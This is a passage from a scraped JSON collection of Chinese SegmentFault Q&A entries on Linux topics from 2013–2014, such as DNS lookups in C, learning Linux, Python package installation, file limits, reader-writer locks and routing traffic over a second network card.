hostp-&gt;h_aliases; *pp != NULL; pp++){\n        printf(\"alias: %s\\n\", *pp);\n   }\n\n   for(pp = hostp-&gt;h_addr_list; *pp != NULL; pp++){\n        addr.s_addr = ((struct in_addr *) *pp)-&gt;s_addr;\n        printf(\"address: %s\\n\", inet_ntoa(addr));\n   }\n\n   return 0;\n}\n</code></pre>\n<p>运行命令:</p>\n<pre><code>&gt;./hostinfo www.17173.com\n&gt;./hostinfo www.17173.com\n</code></pre>\n<p>得到结果如下:</p>\n<pre><code>official hostname: poolct.17173.com\nalias: www.17173.com\nalias: pooldist.17173.com\naddress: 117.27.230.84\naddress: 117.27.230.82\naddress: 117.27.230.83\naddress: 117.27.230.98\naddress: 117.27.230.75\naddress: 117.27.230.86\naddress: 117.27.230.85\naddress: 117.27.230.80\naddress: 117.27.230.99  \n\nofficial hostname: poolct.17173.com\nalias: www.17173.com\nalias: pooldist.17173.com\naddress: 117.27.230.83\naddress: 117.27.230.82\naddress: 117.27.230.84\naddress: 117.27.230.96\naddress: 117.27.230.75\naddress: 117.27.230.88\naddress: 117.27.230.85\naddress: 117.27.230.80\naddress: 117.27.230.99\n</code></pre>\n<p>现在我想请问2个问题：<br/>\nA.为什么每次返回的 ip 地址的顺序不一样？<br/>\nB.这种顺序有何作用?</p>\n</div>",
      "favourite": "2",
      "glance": "3.4k",
      "tags": [
        "c",
        "网络",
        "linux"
      ],
      "time": "2013-11-25",
      "title": "一个域名对应多个 IP",
      "url": "https://segmentfault.com/q/1010000000343151"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000409735\">\n<blockquote>\n<p>借此回答，我顺便回忆一下当时自己从入门Linux新手到完全用Linux工作的过程。</p>\n</blockquote>\n<ul>\n<li>首先需要一个Linux/UNIX的shell环境。建议安装VirtualBox + Ubuntu（这套组合最方便了，一直到后来我自己搭建测试服务器都是这样做的）。<strong>快速熟悉虚拟机中Linux的安装与基本操作，然后把Windows格式化掉，安装成自己熟悉的Linux发行版，一切就从这里开始。</strong><br><em>其实我真的推荐你多尝试一些不同发行版的安装，毕竟你是在刚接触Linux，需要对Linux有个正确的了解。傻瓜式的安装只会导致你忽略掉很多非常重要的步骤/概念。</em>\n</br></li>\n<li>楼上有朋友提到<a href=\"http://billie66.github.io/TLCL/book/zh/\" rel=\"nofollow\">《The Linux Command Line》</a>，其实网上类似的东西有非常多（那时我读过一部分）。最开始我看的是这本<a href=\"http://book.douban.com/subject/1809211/\" rel=\"nofollow\">《Unix入门经典》</a>，里面都是讲命令行操作的。看完这本书，你会用Linux进行一些简单的操作，但常用的系统管理还是做不了。</li>\n<li>然后就建议认真读<a href=\"http://book.douban.com/subject/5286665/\" rel=\"nofollow\">《Linux命令、编辑器与shell编程(第2版)》</a>这本书。这本书里的内容足够你进行日常Linux使用，以及一些简单的维护、管理等操作。</li>\n<li>做到这些之后你就有自信并且有能力把<a href=\"http://book.douban.com/subject/4889838/\" rel=\"nofollow\">《鸟哥的Linux私房菜.基础学习篇（第三版）》</a>认真读完，想读服务器架设篇就直接读下去。</li>\n<li>不，这还没完。你别只停留在“学”的层面，这样是学不会的，你需要日常使用：听音乐，玩游戏<em>（这个真的可以）</em>，看电影，用Github/GitCafe写博客，各种编程等等。</li>\n<li>最后推荐一本很薄的书<a href=\"http://book.douban.com/subject/7564417/\" rel=\"nofollow\">《Linux/UNIX设计思想》</a>。</li>\n</ul>\n<p>对于入门，我觉得做到这些就够了。自己当时这样一步步走来，这期间也做过简单的运维，直到用上干净清爽的<code>Gentoo</code>。</p>\n<p>希望我的经验对你有所帮助。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000344428\">\n<p>抛砖引玉：<br/>\n1）熟悉并尝试把日常操作尽量在终端中完成；<br/>\n2）大量使用 google 搜索，遇到的问题一般网上会有很多解决办法；<br/>\n3）体验 *nix 下的各种有口碑的开源软件（当然可能会遇到很坑...）<br/>\n4）熟悉 *nix 系统的安装过程...</p>\n<p>and so on...</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000344442\">\n<ol>\n<li>Windows下安装开源的<a href=\"https://www.virtualbox.org/\" rel=\"nofollow\">VirtualBox</a>虚拟机</li>\n<li>安装<a href=\"http://www.linuxdeepin.com/index.en.html\" rel=\"nofollow\">Deepin Linux</a>系统</li>\n<li>学习<a href=\"http://vbird.dic.ksu.edu.tw/\" rel=\"nofollow\">《鸟哥的Linux私房菜》</a>，在Terminal中实践</li>\n<li>从 <a href=\"http://www.github.com\" rel=\"nofollow\">Github</a>中持续学习</li>\n</ol>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000344401\">\n<p>作为一名使用windows的人，如何才能快速地入门Linux呢？</p>\n</div>",
      "favourite": "8",
      "glance": "2.9k",
      "tags": [
        "程序员",
        "linux"
      ],
      "time": "2013-11-26",
      "title": "如何快速地Linux入门？",
      "url": "https://segmentfault.com/q/1010000000344401"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000346308\">\n<p>pip之类的东西</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000346649\">\n<p>make install是因为有Makefile文件<br/>\npython包里类似的叫做setup.py，安装python包用：</p>\n<pre><code>$ python setup.py install\n</code></pre>\n<p>一般会安装到系统级的site-packages下。权限不足的话，前面带上 sudo</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000346963\">\n<p>一般有三种：</p>\n<ol>\n<li>python setup.py install</li>\n<li>pip install xxx</li>\n<li>easy_install xxx</li>\n</ol>\n<p>它们大多数时候需要 sudo。其中 setup.py 找找文档就能写了，就我了解到的，setup.py 一般不是机器生成的吧.. 如果软件有上传到 pypi，pip 就可以了。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000346290\">\n<p>用 Python 编写的软件是如何安装到 Linux 系统中的？</p>\n<p>用 C 或 C++ 编写的软件可以通过使用 make install 来安装的系统之中。用 Python 写的软件又该如何安装？</p>\n<p>==========================</p>\n<p>更新：特别是我自己编写的软件如何安装？</p>\n</div>",
      "favourite": "1",
      "glance": "3.1k",
      "tags": [
        "python",
        "linux"
      ],
      "time": "2013-11-28",
      "title": "用 Python 编写的软件是如何安装到 Linux 系统中的",
      "url": "https://segmentfault.com/q/1010000000346290"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000349780\">\n<p>在linux文件里每一行记录一个字符串，如——<code>I波纹管</code>，<br/>\n当我通过PHP从文件里读出这一行数据时，变成了——<code>I^B波纹管</code>，多了“^B”，我该如何去除这种类似的特殊字符？</p>\n</div>",
      "favourite": "4",
      "glance": "1.6k",
      "tags": [
        "php",
        "linux",
        "nginx",
        "mysql",
        "apache"
      ],
      "time": "2013-12-02",
      "title": "PHP如何去除从Linux文件读出来的特殊字符",
      "url": "https://segmentfault.com/q/1010000000349780"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000354768\">\n<p>git log 可以通过相应参数设置输出格式，实现彩色的log输出</p>\n<p>假如运行某程序有这样的log实时输出到控制台：</p>\n<pre><code>    [info] xxx\n</code></pre>\n<p>怎样为'[info]'添加颜色？</p>\n<p>echo和sed可不可以？</p>\n</div>",
      "favourite": "1",
      "glance": "2k",
      "tags": [
        "linux"
      ],
      "time": "2013-12-08",
      "title": "linux终端打印彩色log",
      "url": "https://segmentfault.com/q/1010000000354768"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000366593\">\n<p>请问有没有第三方的Python的频率限制模块。可以记录某个用户或者某个IP对于某个接口的单位时间内（/秒/分）的访问次数，如果超出这个频率就返回错误。<br/>\n因为最近老是有人刷我的敏感接口，导致核心业务受影响。</p>\n</div>",
      "favourite": "2",
      "glance": "2.4k",
      "tags": [
        "服务器",
        "python",
        "linux"
      ],
      "time": "2013-12-21",
      "title": "有没有Python第三方频率限制模块",
      "url": "https://segmentfault.com/q/1010000000366593"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000377025\">\n<p>系统都已经配置了：</p>\n<pre><code>/etc/security/limits.conf\n*               soft    nofile          65000\n*               hard    nofile          65000\n\n/etc/sysctl.conf\nnet.ipv4.ip_local_port_range = 1024 65000\n\nulimit -n\n//output 6500\n</code></pre>\n<p>现有一个很奇怪的现在，有个程序还是会报 “too many open files”，跟了一个下午发现，重启系统后，自动启动的进程的max open files还是默认的1024：</p>\n<pre><code>cat /proc/751/limits\nMax open files            1024                 4096                 files\n</code></pre>\n<p>但是手动重启程序后，恢复：</p>\n<pre><code>cat /proc/1432/limits\nMax open files            65000                 65000                 files \n</code></pre>\n<p>是不是这些进程启动级别高，以至于启动时系统配置还没生效？哪里没有配置正确？</p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "linux",
        "运维"
      ],
      "time": "2014-01-03",
      "title": "linux - too many open files?",
      "url": "https://segmentfault.com/q/1010000000377025"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000410331\">\n<p><code>/data</code>一般是用来存放数据的,比如mongodb的数据库就存放在这里。<br>\napache的web目录是在<code>/var/www</code>，你可以考虑一下。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000410381\">\n<p>一般放在/var/www目录下面</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000410510\">\n<p>安全是由目录权限所决定的，而不是放在/home还是/data的问题。比如你的nginx是由www用户启动的，html目录名为htdocs，可以按如下设置:</p>\n<pre><code>drwxr-----  2 www  www          6 02-17 15:20 htdocs\n</code></pre>\n<p>其中www用户尽量用-s /sbin/nologin禁止登录，而具体是否要给写(w)和执行(x)权限，得看你需求。<br>\n注意：赋予权限尽量是最小化原则。</br></p>\n<p>BTW: 如果你/home目录下的html过大，你完全可以mv到/data目录，然后用ln -s链接到/home目录。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000410277\">\n<p>linux 大家一般把web目录放在哪个分区下面呢？<br>\n放在<code>/data</code>目录下面安全吗？<br>\n我之前都是用的lnmp集成环境的默认配置web目录放在了<code>/home/wwwroot/</code>里面<br>\n这次想换到<code>/data</code> 不知道是否OK呢？</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "8.9k",
      "tags": [
        "linux"
      ],
      "time": "2014-02-17",
      "title": "linux 大家一般把web目录放在哪个分区下面呢？放在/data目录下面安全吗？",
      "url": "https://segmentfault.com/q/1010000000410277"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000428187\">\n<p>一个系统能支撑多大的量，我觉得跟操作系统没太大关系，使用 windows 的人照样能撑起很大的量。</p>\n<p>我们七牛使用的所有都是 Ubuntu 的最新版，已有的旧版本也在升级中。目前每天支持几亿的上传和下载请求。旧版本意味着“稳定”的同时，也意味它暗含很多最新发现的 bug。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000438564\">\n<p>我个人觉得是<code>CentOS</code> 或者<code>Debian</code>比较合适的，在操作习惯上面来说，无论是<code>yum</code>还是<code>apt</code>也都很方便的。</p>\n<p>如果你是自己折腾的话, 推荐<code>Gentoo</code></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000428407\">\n<p>首先 BSD 不是 Linux...</p>\n<p>然后我来谈谈服务器的操作系统。</p>\n<p>Windows 我不是很了解，反正在我的印象中用了 Windows 基本就是上了微软的贼船，陆陆续续还要用微软的其他服务，否则根本体现不了 Windows 的优势。</p>\n<p>然后类 Unix 系统里，毫无疑问 Linux 是使用最广泛的，资料和社区也更丰富一点。Linux 不同发行版的主要区别在于包管理器和软件仓库。根据项目的需求来选择不同的发行版。</p>\n<p>比如包管理器使用最广的是 Debian 的 apt 和 Red Hat 的 yum, 这两个谁更优秀这个不太好说。另外还有一些比较小众的包管理器，有些可能确实要比 apt 和 yum 更好，但是用户太少。</p>\n<p>软件仓库方面 Red Hat 是商业公司，软件包的质量通常会更好一点，CentOS 的软件包来自 Red Hat, 也算是有保证。Debian 算是最传统的 Linux 发行版，比较稳重，对非自由软件的态度不是很好。Ubuntu 基于 Debian, 相比之下更激进一点，软件包的版本会比较新，个人感觉非 LTS 版本中问题会比较多，现在 Ubuntu 的桌面和服务器用户也都比较多。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000428162\">\n<p>大型的网站都用什么发行版。据我所知，豆瓣起初用的是Gentoo,不知道现在用什么。<br>\n另外是不是freebsd相较linux在稳定性和网络吞吐量性能要好点，最近火爆的whatsapp，用的是freebsd，他们用很少的服务器支撑4.5亿的用户。<br>\n还有用freebsd做开发怎么样？</br></br></p>\n</div>",
      "favourite": "7",
      "glance": "4.9k",
      "tags": [
        "linux",
        "freebsd",
        "服务器端"
      ],
      "time": "2014-03-09",
      "title": "大型的网站都用什么Linux发行版",
      "url": "https://segmentfault.com/q/1010000000428162"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000440796\">\n<pre><code>    #!/kubi/local/php/bin/php -q \n    &lt;?php\n        function  Directorys($dir){    \n            return   is_dir ( $dir )  or  (Directorys(dirname( $dir ))  and   mkdir ( $dir , 0777));\n        }\n$urls = './kubi/local/apache2/htdocs/kubi/Upload/'.date('Y').'/'.date('m').'/'.date('d').'/'.$lujing;\nDirectorys($urls);\n</code></pre>\n<p>绝对路径  相对路径我都用了都不能创建   如果用浏览器执行这个文件是可以创建的  用linux计划任务就是不可以</p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "linux",
        "php"
      ],
      "time": "2014-03-20",
      "title": "linux下怎么用计划任务执行PHP创建文件夹",
      "url": "https://segmentfault.com/q/1010000000440796"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000466146\">\n<p>最近清理磁盘文件时，删除了一个<code>nohup.out</code>文件，发现其占用的磁盘空间并没有被释放。最终找到关联的进程，杀掉进程后，磁盘空间才被释放。</p>\n<p>使用<code>ls -al</code>查看<code>/proc</code>下的文件描述符（fd），发现它们是软连接（lr-x——），为什么删除掉文件后，磁盘空间没有被释放呢？</p>\n<p>关联文章：<a href=\"http://milkythinking.com/blog/2014/04/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A3%81%E7%9B%98%E6%B8%85%E7%90%86%E7%9A%84%E8%BF%87%E7%A8%8B/\" rel=\"nofollow\">记一次磁盘清理的过程</a></p>\n</div>",
      "favourite": "2",
      "glance": "2k",
      "tags": [
        "linux",
        "文件描述符"
      ],
      "time": "2014-04-12",
      "title": "一个文件描述符与磁盘空间释放的问题",
      "url": "https://segmentfault.com/q/1010000000466146"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000475111\">\n<p>在知乎上看到<a href=\"http://www.zhihu.com/question/22463820\" rel=\"nofollow\">类似的问题</a></p>\n<p>目前正在follow<a href=\"https://github.com/SamyPesse/How-to-Make-a-Computer-Operating-System\" rel=\"nofollow\">这个github项目</a>制作操作系统</p>\n<p>希望听到SF的亲历者说说你们的操作系统制作历程</p>\n</div>",
      "favourite": "3",
      "glance": "1.4k",
      "tags": [
        "程序员",
        "编程",
        "操作系统",
        "linux",
        "linux-kernel"
      ],
      "time": "2014-04-19",
      "title": "写一个简单的操作系统需要经过哪些步骤和流程？",
      "url": "https://segmentfault.com/q/1010000000475111"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000482686\">\n<p>千万别装。<a href=\"http://www.vpsee.com/faq/\" rel=\"nofollow\">VPSee大神有一个论述</a>很值得参考：</p>\n<blockquote>\n<p>你们提供控制面板吗？</p>\n<p>不提供。为了安全考虑，我们不打算使用任何商业和开源控制面板，如果你需要重装系统、更换操作系统的话需要邮件联系我们。根据我们的经验，控制面板不是客户必需的，我们很看重服务器的稳定性（到目前为止我们的服务器从来没有因为系统的原因重启过）和安全，提供控制面板对服务器稳定和性能不能带来好处但是带来很多坏处，不值得冒险。我们仔细考察了所有主流商业控制面板发现极不安全，比如目前最流行的商业控制面板 SolusVM 接连曝重大漏洞导致客户数据和密码泄露。这些控制面板本身臃肿、需要在服务器上安装一堆东西，东西装多了就容易引入漏洞。我们很看重我们服务器的安全和性能以及客户隐私（你不希望丢失信用卡卡号和常用密码吧，也不希望 VPS 数据被黑被删吧？），我们尽量避免这些复杂的东西，只用一些简单、我们能理解的工具。</p>\n</blockquote>\n<p>核心意思就是：引入新东西的代价就是引入新问题。越简单越安全，装东西的准则只有“除非必须”。</p>\n<p>两三个网站算什么规模？管理下配置文件，做点笔记，最多写一点儿脚本，很容易就能收拾。</p>\n<p>除非管理（或给他人提供）大量网站，否则面板就是自找的麻烦。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000483491\">\n<p>这和装逼不装逼真的没有关系。。</p>\n<p>如果就一两个网站并且为了安全，平时一般不需要改动，那就不要装面板浪费资源了。</p>\n<p>假如你要放好多网站有时候需要管理什么的，老是ssh有时候不方便，那你就应该装面板。<br>\n如果你还想与朋友分享你的主机，那就更应该装面板了。</br></p>\n<p>既然是vps么，装个面板玩玩未尝不可，手动配置也很有意义，具体使用应该因人而已~</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000482665\">\n<p>自己懂技术，没必要装面板。<br>\n自己不懂技术，那你干嘛买vps/云主机？</br></p>\n<p>所以，综上所述，不需要装面板。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000482657\">\n<p>买的一款低配云服务器，单核512内存，现在跑的是Nginx+uwsgi+Python+flask+mongodb，网站规模不大，之所以采用这些程序完全出于兴趣爱好,网站是自己的，规模也不大,可能最多放两三个网站，现在是使用SSH直接管理的，的确有些麻烦，现在关心这么几个问题：</p>\n<p>1.有没有必要安装面板管理软件<br>\n2.ZPannel怎么样，是否耗资源<br>\n3.ZPannel配合我上面的功能是否方便<br>\n4.有无更好的建议</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "2k",
      "tags": [
        "linux",
        "云主机"
      ],
      "time": "2014-04-25",
      "title": "有必要装主机管理面板吗？",
      "url": "https://segmentfault.com/q/1010000000482657"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000501782\">\n<p><code>locate /* -c</code>和<code>sudo ls -RFal /|wc</code><br>\n为什么两个计数不一样呢。。。<br><code>locate</code>几乎是我最爱的一条命令了。。。</br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.1k",
      "tags": [
        "linux"
      ],
      "time": "2014-05-11",
      "title": "locate和ls的文件数为啥不一样",
      "url": "https://segmentfault.com/q/1010000000501782"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000505022\">\n<p>楼主需要的是进程(process)之间共共享内存，那么这个时候pthread无法帮忙，因为pthread是线程(thread)级别的锁。 进程之间共享内存一般通过memory mapped file来进行，参见mmap函数。如果需要枷锁操作，可以根据情况选用文件锁 fcntl,或者信号量(Semaphores) semget函数来进行读写的限制。<br>\n如果楼主本意是线程的话，那么pthread_rwlock应该就够了。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000504725\">\n<p>一个读的信号量，一个写的信号量，读信号量初始化为0，写的信号量初始化为1。<br>\n读的时候先查看写是否为1，如果是，则将读信号量加1，完成后-1；若不是则表示现在不能读。写的时候先查看读的信号量是否为0，若为0，则将写的信号量-1；若不为0，就表示不能写，写完成后，写信号量加1.<br>\n记得以前学操作系统上面的</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000504719\">\n<p>这不就是读写锁么？<br>\n参见pthread_rwlock_init(3)，需要定义__USE_UNIX98或__USE_XOPEN2K<br>\n或者 <a href=\"http://en.cppreference.com/w/cpp/thread/shared_lock\" rel=\"nofollow\">http://en.cppreference.com/w/cpp/thread/shared_lock</a></br></br></p>\n<p>另外，你用mutex和condition_variable自己实现一个也不麻烦</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000504702\">\n<p>语言是c/c++</p>\n<p>需求是这样的，有一段共享内存大家都可以读，只有一个进程可以写，然后大家读都没有问题，但是写的时候必须所有人都不在读的时候才可以写。</p>\n<p>两组lock操作，第一组把一个ref+-1，然后允许读取。<br>\n第二组lock的时候先等待ref=0，这时候所有第一种lock会被堵塞，然后等ref=0开始读写这部分内存，unlock之后放行第一种lock。</br></p>\n<p>这种锁如何实现，或者说叫什么名字？</p>\n<p>我自己想的办法是另开一个进程，然后和这些进程建立一个socket，然后其他进程向这个进程请求资源，请求之后开始read，当资源空闲的时候就直接write，否则就加入一个cleanup队列，直到写入操作介绍之后再一起write，但是我感觉这样太浪费资源来的。。</p>\n</div>",
      "favourite": "0",
      "glance": "1.9k",
      "tags": [
        "linux",
        "锁",
        "c++",
        "c"
      ],
      "time": "2014-05-13",
      "title": "Linux下怎么实现这样的锁？",
      "url": "https://segmentfault.com/q/1010000000504702"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000505899\">\n<p>环境是Ubuntu14.04,  使用命令which python3 的时候, 得到一个链接:</p>\n<pre><code>/usr/local/bin/python3\n</code></pre>\n<p>指向:</p>\n<pre><code>/usr/local/lib/python3.4\n</code></pre>\n<p><strong>然而, 在/usr/lib/ 下, 尽然也存在一个这样的非空python3文件夹</strong></p>\n<pre><code>/usr/lib/python3.4\n</code></pre>\n<p>想问一下, 为什么会存在两个这样的文件夹 ?哪一个才是有效的, 或者都是有效的吗?</p>\n<p>谢谢.</p>\n</div>",
      "favourite": "0",
      "glance": "4.9k",
      "tags": [
        "linux",
        "python"
      ],
      "time": "2014-05-14",
      "title": "Linux下/usr/local/lib 和 /usr/lib 里的内容有什么区别?",
      "url": "https://segmentfault.com/q/1010000000505899"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000516023\">\n<p><a href=\"http://cn2.php.net/manual/zh/function.pcntl-waitpid.php\" rel=\"nofollow\">http://cn2.php.net/manual/zh/function.pcntl-waitpid.php</a><br>\nphp手册还是非常有学习价值的</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000519956\">\n<p>题主会了吗？我这边用了下pcntl这个方法，貌似要捕获子进程状态的时候父进程就会被阻塞，不过PHP从5.3之后开始支持多线程了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000513024\">\n<p>我一般用php daemon来做，一个进程作为父进程一直跑着（可能是个while + sleep），父进程判断时间到了，就fork一个/多个子进程来处理业务，这时父进程监听子进程退出信号，子进程业务执行完了就退出了，这时父进程会检测到，直到所有子进程退出。</p>\n<p>一个原则就是父进程尽可能简单，不要处理业务逻辑，从而保证父进程的稳定性。子进程去处理业务，即使出现FataErr也不会导致所有进程退出。</p>\n<p>还有个小提示：信号是可以被覆盖的，也就是说两个子进程退出时，父进程可能只收到一个信号，这时父进程应该用while循环来处理子进程退出事件</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000512596\">\n<blockquote>\n<p>我们通常在Linux上调用PHP来执行定时任务,如<code>php -f xxx.php</code>,有时候需要先有一个PHP父进程,然后开启多个PHP子进程来做同一件事...</p>\n</blockquote>\n<p>如果这时候当其中一个子进程结束或出现问题时通知父进程,父进程就可以做一些事,如关闭其它正在运行的进程等等吧....</p>\n<p>想了解一下大家在此类问题上是怎么实现或处理的?</p>\n</div>",
      "favourite": "9",
      "glance": "3.8k",
      "tags": [
        "php",
        "nginx",
        "apache",
        "mysql",
        "linux"
      ],
      "time": "2014-05-19",
      "title": "关于开启PHP多进程与它们之间的通信问题",
      "url": "https://segmentfault.com/q/1010000000512596"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000522752\">\n<p>为什么系统调用比普通函数调用耗时？如果是因为需要用户态和内核态的切换，那么这个切换具体做了什么，哪些步骤代价大呢？</p>\n</div>",
      "favourite": "0",
      "glance": "3.7k",
      "tags": [
        "操作系统",
        "linux",
        "linux编程"
      ],
      "time": "2014-05-28",
      "title": "为什么系统调用比普通的函数调用更耗时？用户态和内核态切换的代价在哪？",
      "url": "https://segmentfault.com/q/1010000000522752"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000522810\">\n<html><body><p>颜色的不同是否有着什么意义呢？<img data-src=\"http://segmentfault.com/img/bVcmay\"/></p></body></html>\n</div>",
      "favourite": "2",
      "glance": "2.8k",
      "tags": [
        "linux",
        "ubuntu"
      ],
      "time": "2014-05-28",
      "title": "有时候通过ssh连接到linux主机的时候，主机名的颜色是不同的，如何实现？",
      "url": "https://segmentfault.com/q/1010000000522810"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000596765\">\n<pre><code class=\"lang-bash\">route add -net CMCC的网段 netmask xxx dev 第二块网卡的名字\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000597044\">\n<p>Python 程序的话，在 <code>socket.connect</code> 之前 <code>socket.bind(('需要用的本地网卡IP', 0))</code> 就可以了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000596680\">\n<p>我做毕业设计的时候就撞过这个。当时的需求和你的差不多：</p>\n<ul>\n<li>FC18系统</li>\n<li>双网卡</li>\n<li>一个连了标准路由器：ADSL宽带上网，国内外网站访问快，不能访问校内专属资源</li>\n<li>一个连了校园网内网：访问外网弹Web认证界面，但可以访问校内专属资源，无需认证且享局域网网速</li>\n<li>系统当时的默认行为好像是乱搞的……</li>\n</ul>\n<p>我把当时做的笔记共享一下。</p>\n<blockquote>\n<h3>北航校园网特性</h3>\n<ul>\n<li>速度不稳定，受校园网使用人数影响明显。</li>\n<li>内网传输快，校园网内的计算机都处在同一局域网内。</li>\n<li>国内互联网访问速度一般。</li>\n<li>国外互联网速度差。</li>\n<li>网上查询北航的网段在：202.112.128.0/202.122.143.255，证实财务处、校园网认证、网络中心等学校机构网站都在此范围内。</li>\n</ul>\n<h3>Fedora的路由配置</h3>\n<p>因为我寝室电脑用的是Fedora，所以以Fedora为例。Windows下怎么配置不是很清楚。首先用双网卡，同时连接校园网端口，和ADSL宽带用的路由器。</p>\n<p>对连接北航内网的适配器p17p1编辑网络属性：</p>\n<ul>\n<li>IPv4设置：自动(DHCP)</li>\n<li>IPv4设置-路由：地址202.112.128.0 子网掩码255.255.240.0 网关192.168.11.33 公制</li>\n<li>[V]忽略自动获取的路由</li>\n<li>[V]仅将此连接用于相对应网络上的资源</li>\n</ul>\n<p>对连接ADSL公网的wlan0，无需编辑网络属性，保持自动。</p>\n<h3>效果</h3>\n<ul>\n<li>能够访问财务处、网络中心等通过公网不能访问的北航校内网站。此时数据走校园网。</li>\n<li>访问任何其他网站能够获得稳定的速度。此时数据走ADSL宽带。</li>\n</ul>\n</blockquote>\n<p>补充一下，两块网卡的IP相同没什么稀奇的，也没什么需要考虑的。重要的是调查到<strong>CMCC业务专线对方服务器的IP或IP段</strong>。这个方法仅使用解析到的对方IP地址，决定数据走哪块网卡。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000596420\">\n<p>是这样的，我有一台远程的Linux服务器（Debian系统），上面有两块网卡，同样的IP。</p>\n<p>我现在需要选择第二块网卡，因为这块网卡连上了CMCC的专线，可以进行一些CMCC的业务操作。但是默认的使用的是第一块网卡。</p>\n<p>不知道如何实现选择不同的网卡进行网络访问。<br>\n谢谢</br></p>\n<hr>\n<p>谢谢各位的回答，总结了各位的答案，我成功的解决了问题。<br>\n一开始两个网卡同个IP是服务器那边配置出了问题，没有配置第二个网卡的内网IP，现在配置了之后两个网卡分别有两个IP地址。</br></p>\n<p>首先运行nmcli查看两个网卡的网关：</p>\n<pre><code>sudo nmcli dev list\n</code></pre>\n<p>其中的IP4的GW就是网关的，可以直接这样查看：</p>\n<pre><code>sudo nmcli dev list | grep gw\n</code></pre>\n<p>然后记着那张需要的网卡的gw地址xxx.xxx.xxx.xx，然后使用下面这条命令：</p>\n<pre><code>sudo route add -host xxx.xxx.xxx.xxx gw xxx.xxx.xxx.xx\n</code></pre>\n<p>其中第一个是需要制定访问eth1网卡的Host地址，第二个是前面查到的网关的内容。</p>\n<p>再次感谢大家的热心帮助。<br>\n```</br></p>\n</hr></div>",
      "favourite": "4",
      "glance": "3.7k",
      "tags": [
        "linux",
        "python",
        "网络"
      ],
      "time": "2014-07-05",
      "title": "Linux下如何选择不同的网卡进行网络访问？Python或者其他",
      "url": "https://segmentfault.com/q/1010000000596420"
    },
    {
